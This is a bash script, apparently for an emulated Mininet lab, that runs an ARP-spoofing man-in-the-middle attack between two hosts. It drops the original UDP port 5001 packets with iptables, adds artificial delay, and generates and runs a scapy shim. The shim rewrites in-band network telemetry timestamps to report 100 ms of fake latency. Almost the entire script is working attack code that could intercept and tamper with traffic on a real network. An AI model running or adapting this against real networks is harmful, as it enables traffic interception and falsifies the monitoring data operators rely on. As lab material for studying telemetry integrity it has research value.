#!/usr/bin/env bash
set -e

# ─── CONFIG ─────────────────────────────────────────────
IFACE="h1-eth0"           # inside h1 namespace
INT_PORT=5001
DELAY_MS=100
H2_IP="10.0.0.2"
H3_IP="10.0.0.3"

# ─── ROOT CHECK ────────────────────────────────────────
if [[ $EUID -ne 0 ]]; then
  echo "⚠️  Please run as root (sudo)" >&2
  exit 1
fi

# ─── ENABLE FORWARDING ──────────────────────────────────
echo "[*] Enabling IP forwarding"
sysctl -w net.ipv4.ip_forward=1 >/dev/null

# ─── DROP ORIGINAL INT IN IPTABLES ────────────────────
echo "[*] Installing iptables rule to DROP original UDP dst port ${INT_PORT}"
# Use mangle/PREROUTING so kernel never forwards the real INT packets
iptables -t mangle -A PREROUTING -i "${IFACE}" \
         -p udp --dport "${INT_PORT}" -j DROP

# ─── APPLY REAL DELAY ──────────────────────────────────
echo "[*] Applying ${DELAY_MS}ms real delay on ${IFACE}"
tc qdisc add dev "${IFACE}" root netem delay "${DELAY_MS}ms"

# ─── ARP SPOOFING ──────────────────────────────────────
echo "[*] Starting ARP spoofing for h3→h2 and h2→h3"
arpspoof -i "${IFACE}" -t "${H3_IP}" "${H2_IP}" >/dev/null 2>&1 &
ARP1=$!
arpspoof -i "${IFACE}" -t "${H2_IP}" "${H3_IP}" >/dev/null 2>&1 &
ARP2=$!

# ─── GENERATE MITM‐SHIM SCRIPT ────────────────────────
cat > /tmp/mitm_false_latency.py <<'EOF'
#!/usr/bin/env python3
import struct
from scapy.all import sniff, sendp, Ether, IP, UDP, Raw

INT_PORT      = 5001
FAKE_DELAY_MS = 100
IFACE         = "h1-eth0"

# mask for our “already-processed” bit
PROCESSED_FLAG = 0x80

def process(pkt):
    # only handle INT-shim packets to port INT_PORT
    if not (IP in pkt and UDP in pkt and Raw in pkt and pkt[UDP].dport == INT_PORT):
        return

    payload = pkt[Raw].load
    hop = payload[0]

    # drop anything we’ve already stamped
    if hop & PROCESSED_FLAG:
        return

    # unpack original timestamp, add fake latency
    orig_ts = struct.unpack("!Q", payload[1:9])[0]
    fake_ts = orig_ts + FAKE_DELAY_MS

    print(f"[MITM] {pkt[IP].src}->{pkt[IP].dst} orig={orig_ts} fake={fake_ts}")

    # stamp high bit in hop, rebuild payload
    new_hop     = hop | PROCESSED_FLAG
    new_shim    = bytes([new_hop]) + struct.pack("!Q", fake_ts)
    new_payload = new_shim + payload[9:]

    # rebuild and resend out the same interface
    new_pkt = (
        Ether(src=pkt[Ether].src, dst=pkt[Ether].dst) /
        IP(src=pkt[IP].src,     dst=pkt[IP].dst) /
        UDP(sport=pkt[UDP].sport, dport=INT_PORT) /
        Raw(new_payload)
    )
    del new_pkt[IP].chksum
    del new_pkt[UDP].chksum
    sendp(new_pkt, iface=IFACE, verbose=False)

sniff(iface=IFACE, filter=f"udp and dst port {INT_PORT}", prn=process)
EOF

chmod +x /tmp/mitm_false_latency.py

# ─── CLEANUP FUNCTION ─────────────────────────────────
cleanup() {
    echo "[*] Cleaning up"
    tc qdisc del dev "${IFACE}" root 2>/dev/null || true
    iptables -t mangle -D PREROUTING -i "${IFACE}" \
             -p udp --dport "${INT_PORT}" -j DROP 2>/dev/null || true
    kill $ARP1 $ARP2 2>/dev/null || true
    rm -f /tmp/mitm_false_latency.py
}
trap cleanup EXIT

# ─── RUN MITM LOOP ────────────────────────────────────
echo "[*] Starting INT‐shim MITM (press Ctrl-C to stop)"
python3 /tmp/mitm_false_latency.py
